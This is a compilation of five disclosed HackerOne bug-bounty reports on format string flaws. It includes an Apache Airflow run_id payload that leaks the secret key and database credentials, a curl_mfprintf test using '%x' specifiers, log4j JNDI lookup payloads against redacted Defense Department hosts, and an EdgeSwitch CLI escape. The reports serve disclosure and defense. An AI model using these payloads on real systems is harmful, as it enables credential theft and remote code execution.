# Use of Externally-Controlled Format String

_5 reports — High/Critical, disclosed_

### [CVE-2022-40604: Apache Airflow: Format String Vulnerability](https://hackerone.com/reports/1707287)

- **Report ID:** `1707287`
- **Severity:** Critical
- **Weakness:** Use of Externally-Controlled Format String
- **Program:** Internet Bug Bounty
- **Reporter:** @leixiao
- **Bounty:** 8000 usd
- **Disclosed:** 2025-01-18T16:28:11.849Z
- **CVE(s):** CVE-2022-40604

**Vulnerability Information:**

There is a Format String Vulnerability in src/airflow/utils/log/file_task_handler.py 

> url = os.path.join("http://{ti.hostname}:{worker_log_server_port}/log", log_relative_path).format(
>   ti=ti, worker_log_server_port=conf.get('logging', 'WORKER_LOG_SERVER_PORT')
> )

 In the above code, I can control some part of the `log_relative_path`, because `log_relative_path` is made up of `run_id` and other things.

Attack steps:
1. Enter the DAGs menu, Choose any DAG, select `Trigger DAG w/ config`.
2. Set the run_id to `{ti.task.__class__.__init__.__globals__[conf].__dict__}` and trigger it.
3. Enter the `/xcom/list/` page, click to enter the corresponding task page.
4. Click the `Log` option and capture the packet, you will get a request similar to the following:
`/get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=1&metadata=null`
5. Modify `try_number` to a nonexistent value, such as 9999, such as:
`/get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=9999&metadata=null`
6. Paste the modified url into the browser for access

## Impact

Attacker  can get a lot of sensitive information through this vulnerability, such as `secret_key`, database connection string, various configurations. 
Can forge identity by the `secret_key`, can get the database password by database connection string, etc. Moreover, this vulnerability can be triggered by any DAG and exists in the production environment, so I think it's critical.

**Summary (team):**

##Description:

In Apache Airflow 2.3.0 through 2.3.4, part of a url was unnecessarily formatted, allowing for possible information extraction.

##Credit:

The Apache Airflow PMC would like to thank L3yx of Syclover Security Team for reporting this issue.

##References:

https://github.com/apache/airflow/pull/26337

---

### [Exploitable Format String Vulnerability in curl_mfprintf Function](https://hackerone.com/reports/2819666)

- **Report ID:** `2819666`
- **Severity:** High
- **Weakness:** Use of Externally-Controlled Format String
- **Program:** curl
- **Reporter:** @reterix
- **Bounty:** - usd
- **Disclosed:** 2024-11-06T07:00:49.533Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:

The curl_mfprintf function in the curl_printf.h file contains a format string vulnerability that allows an attacker to inject arbitrary format specifiers. This can lead to unauthorized access to memory content, potential application crashes, or leakage of sensitive data.

Steps To Reproduce:

    Prepare the Test Code: Create a new file named test_printf.c with the following content:

#include <stdio.h>
#include "curl_printf.h"

int main() {
    char* user_input = "%x %x %x %x";  // Attempt to read memory content
    curl_mfprintf(stdout, user_input); // Passing user-controlled input to the vulnerable function
    return 0;
}

Compile the Code: Compile the test program with the following command:

bash

gcc -o test_printf test_printf.c -I./lib -I./include -L./lib/.libs -lcurl

Execute the Code: Run the compiled program:

bash

    ./test_printf

    Observe the Output: The output should display memory content, which confirms that the vulnerability is exploitable.

## Impact

This vulnerability allows an attacker to use format string specifiers to access arbitrary memory locations. By exploiting this issue, an attacker could potentially:

    Leak sensitive information from the process memory.
    Cause a denial-of-service by crashing the application.
    Further exploit the application depending on the context of the memory exposure.

---

### [███ ████████ running a vulnerable log4j](https://hackerone.com/reports/1438393)

- **Report ID:** `1438393`
- **Severity:** Critical
- **Weakness:** Use of Externally-Controlled Format String
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alex_gaynor
- **Bounty:** - usd
- **Disclosed:** 2022-01-19T19:35:32.091Z
- **CVE(s):** -

**Vulnerability Information:**

#Report

**Description:**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

## Impact

Probably arbitrary code execution

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Browse to https://██████████/█████████https%3A%2F%2F███%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit

Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.

## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.



#Activity Timeline

2021-12-10 18:16 (-0600) (comment)
Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team

---

2021-12-13 08:29 (-0600): @agent-l8 (report severity updated)
null

---

2021-12-13 08:29 (-0600): @agent-l8 (bug triaged)
Greetings,

We have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.

Thank you for bringing this vulnerability to our attention!

We will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.

You will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.

Thanks again for supporting the DoD Vulnerability Disclosure Program.

Regards,

The VDP Team

---

---

### [██████████ running a vulnerable log4j](https://hackerone.com/reports/1423496)

- **Report ID:** `1423496`
- **Severity:** Critical
- **Weakness:** Use of Externally-Controlled Format String
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alex_gaynor
- **Bounty:** - usd
- **Disclosed:** 2022-01-19T19:33:44.463Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

**Description:**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

## Impact

Probably arbitrary code execution

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Browse to https://████████/███████https%3A%2F%2F█████████%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit

Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.

## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.

---

### [Format String Vulnerability in the EdgeSwitch restricted CLI](https://hackerone.com/reports/311884)

- **Report ID:** `311884`
- **Severity:** High
- **Weakness:** Use of Externally-Controlled Format String
- **Program:** Ubiquiti Inc.
- **Reporter:** @maxpl0it
- **Bounty:** - usd
- **Disclosed:** 2018-06-19T12:18:23.721Z
- **CVE(s):** -

**Summary (team):**

In EdgeSwitch 1.7.3 and prior, an user with admin credentials can make use of specially crafted commands to execute arbitrary shell instructions, bypassing the SSH/TELNET CLI interface.

**Summary (researcher):**

There was a format string vulnerability present in the Admin CLI for the EdgeSwitch.

Exploiting this vulnerability allows an attacker to break out of the restricted CLI and **elevate their privileges greater than the administrator themselves are able to**, taking full control of the Switch without the administrator ever knowing.

---
